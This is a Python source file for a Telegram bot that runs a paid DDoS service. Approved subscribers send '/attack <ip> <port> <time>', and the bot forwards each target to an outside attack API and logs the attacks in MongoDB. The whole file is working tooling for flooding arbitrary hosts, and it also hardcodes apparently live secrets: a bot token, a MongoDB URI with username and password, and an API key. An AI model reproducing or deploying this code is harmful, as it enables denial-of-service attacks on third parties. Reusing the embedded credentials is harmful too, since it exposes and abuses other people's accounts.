import asyncio
import logging
import requests
import threading
import time as time_module
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps
import re
import uuid
import os
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# --- CONFIG (Using Your Variables) ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL", "https://api.battle-destroyer.shop")
API_KEY = os.getenv("API_KEY", "ak_e09b114844018935feffc")
ADMIN_IDS = [8787952549, 1793697840]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT, MAX_PORT = 1, 65535

# --- HELPER FUNCTIONS ---
def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# --- DATABASE CLASS (Your Implementation) ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self._setup_indexes()

    def _setup_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
            self.attacks.create_index([("timestamp", DESCENDING)])
            logger.info("Database indexes synchronized.")
        except Exception as e:
            logger.error(f"Index error: {e}")

    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user

    def create_user(self, user_id: int, username: str = None):
        if not self.get_user(user_id):
            self.users.insert_one({
                "user_id": user_id, "username": username, "approved": False,
                "approved_at": None, "expires_at": None, "total_attacks": 0,
                "created_at": get_current_time(), "is_banned": False
            })

    def approve_user(self, user_id: int, days: int) -> bool:
        expiry = get_current_time() + timedelta(days=days)
        res = self.users.update_one({"user_id": user_id}, 
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expiry}})
        return res.modified_count > 0

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        self.attacks.insert_one({
            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
            "duration": duration, "status": status, "response": response[:500] if response else None,
            "timestamp": get_current_time()
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# --- API INTEGRATION ---
def call_api(endpoint, method="GET", data=None):
    headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}
    url = f"{API_URL}/api/v1/{endpoint}"
    try:
        if method == "POST":
            response = requests.post(url, json=data, headers=headers, timeout=15)
        else:
            response = requests.get(url, headers=headers, timeout=15)
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

# --- AUTH DECORATORS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin Access Required.")
            return
        return await func(update, context)
    return wrapper

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"): return False
    expiry = user.get("expires_at")
    return not (expiry and make_aware(expiry) < get_current_time())

# --- COMMAND HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    if await is_user_approved(user_id):
        await update.message.reply_text("✅ Account Active!\nUse `/attack <ip> <port> <time>`")
    else:
        await update.message.reply_text("❌ Not Approved. Contact @Admin.")

@admin_required
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid, days = int(context.args[0]), int(context.args[1])
        if db.approve_user(uid, days):
            await update.message.reply_text(f"✅ User {uid} approved for {days} days.")
    except:
        await update.message.reply_text("Usage: `/approve <id> <days>`")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        return await update.message.reply_text("❌ Subscription expired or inactive.")

    if len(context.args) < 3:
        return await update.message.reply_text("Usage: `/attack <ip> <port> <time>`")

    ip, port_str, dur_str = context.args[0], context.args[1], context.args[2]
    
    try:
        port, duration = int(port_str), int(dur_str)
        if port in BLOCKED_PORTS: return await update.message.reply_text(f"❌ Port {port} is blocked.")
        if not (1 <= duration <= 300): return await update.message.reply_text("❌ Max time is 300s.")
        
        status_msg = await update.message.reply_text("🚀 Sending request to server...")
        
        # API Call
        res = call_api("attack", "POST", {"ip": ip, "port": port, "duration": duration})
        
        if res.get("success") or "id" in str(res):
            db.log_attack(user_id, ip, port, duration, "success", str(res))
            await status_msg.edit_text(f"✅ **Attack Sent!**\nTarget: `{ip}:{port}`\nTime: `{duration}s`")
        else:
            db.log_attack(user_id, ip, port, duration, "failed", str(res))
            await status_msg.edit_text(f"❌ API Error: {res.get('error', 'Server rejected request')}")
            
    except ValueError:
        await update.message.reply_text("❌ Port and Time must be numbers.")

# --- HEALTH CHECK & SESSION CLEARING ---
app = Flask(__name__)
@app.route('/')
def home(): return "Bot is running", 200

def clear_conflict():
    """Drops webhooks to prevent 409 Conflict error on restart."""
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", params={"drop_pending_updates": True})
        logger.info("Cleaned up existing Telegram sessions.")
        time_module.sleep(3)
    except: pass

# --- MAIN ---
def main():
    clear_conflict()
    
    # Run Flask for Railway
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000))), daemon=True).start()

    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("attack", attack))
    
    print("🤖 Bot instance starting...")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
